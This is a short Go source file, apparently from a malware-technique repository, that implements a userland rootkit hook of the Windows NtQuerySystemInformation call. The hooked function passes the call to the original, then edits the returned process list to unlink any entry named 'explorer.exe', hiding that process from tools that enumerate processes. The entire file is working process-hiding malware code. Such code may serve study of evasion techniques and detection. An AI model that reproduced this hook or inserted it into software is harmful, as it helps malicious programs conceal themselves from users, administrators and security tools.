//go:build windows
// +build windows

package main

import "C"
import (
	"strings"
	"unsafe"

	"github.com/stavinski/malgo/win32"
)

const (
	// process image name to hide
	PROC_HIDE = "explorer.exe"
)

//export HookedNtQuerySystemInformation
func HookedNtQuerySystemInformation(SystemInformationClass C.int, SystemInformation uintptr, SystemInformationLength C.uint, ReturnLength uintptr) C.long {
	// call original to retreive values to work with
	res, _, _ := OriginalNtQuerySystemInformation.Call(uintptr(SystemInformationClass), SystemInformation, uintptr(SystemInformationLength), ReturnLength)

	// manipulate the process list to remove the PROC_HIDE process
	if res == 0 && SystemInformationClass == win32.SystemProcessInformation {
		current := (*win32.SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(SystemInformation))
		next := (*win32.SYSTEM_PROCESS_INFORMATION)(unsafe.Add(unsafe.Pointer(current), current.NextEntryOffset))
		for next.NextEntryOffset != 0 {
			imageName := win32.UTF16PtrToString((*uint16)(unsafe.Pointer(next.ImageName.Buffer)))
			if strings.EqualFold(PROC_HIDE, imageName) {
				current.NextEntryOffset += next.NextEntryOffset
				// win32.ProcMessageBoxW.Call(win32.NULL, uintptr(proc.ImageName.Buffer), uintptr(proc.ImageName.Buffer), win32.NULL)
			}
			current = next
			next = (*win32.SYSTEM_PROCESS_INFORMATION)(unsafe.Add(unsafe.Pointer(current), current.NextEntryOffset))
		}
	}

	return (C.long)(res)
}
